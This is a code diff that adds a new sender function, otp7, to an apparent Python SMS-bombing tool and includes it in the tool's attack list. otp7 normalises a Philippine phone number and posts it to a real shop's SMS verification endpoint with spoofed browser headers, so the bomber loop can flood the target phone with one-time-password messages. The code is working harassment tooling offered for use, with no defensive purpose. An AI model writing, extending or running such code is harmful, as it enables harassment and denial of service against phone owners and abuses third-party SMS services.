@@ -219,7 +219,33 @@ def otp6(number):
         field+=1
         return False
 
-
+def otp7(number):
+    global limit, field
+    if str(number[0]) == "0":
+        number = str(number[1:])
+    elif str(number[0]) == "+":
+        number = str(number[3:])
+    elif str(number[:2]) == "63":
+        number = str(number[2:])
+    else:
+        pass
+    session = requests.Session()
+    session.get("https://www.711shop.net:443/mobile/index/index.html")
+    url = "https://www.711shop.net:443/sms/getCode"
+    header = {'Host': 'www.711shop.net','Connection': 'keep-alive','Content-Length': str(random.randint(13, 18)),'Accept': 'application/json, text/javascript, */*; q=0.01','X-Requested-With': 'XMLHttpRequest','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.46','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Origin': 'https://www.711shop.net','Sec-Fetch-Site': 'same-origin','Sec-Fetch-Mode': 'cors','Sec-Fetch-Dest': 'empty','Referer': 'https://www.711shop.net/mobile/forget.html','Accept-Encoding': 'gzip, deflate','Accept-Language': 'en-US,en;q=0.9'}
+    body = {"phone":str(number)}
+    web = session.post(url, headers = header, data = body)
+    try:
+        web = session.post(url, headers = header, data = body)
+        if int(web.status_code) == 200:
+            limit+=1
+            return True
+        else:
+            field+=1
+            return False
+    except:
+        field+=1
+        return False
 def bomber(function):
     global limit, RUN, limit1, field, slp
     number = open("number.txt", "r").read()
@@ -245,7 +271,7 @@ def home():
     a.write(str(number))
     a.close()
     print("\033[1;92m║ \033[1;94m—> \033[1;92mLimit")
-    function = [otp, otp1, otp2, otp3, otp4, otp5, otp6]
+    function = [otp, otp1, otp2, otp3, otp4, otp5, otp6, otp7]
     limit1 = pick()
     print("\033[1;92m║ \033[1;94m—> \033[1;92mSleep")
     slp = pick()
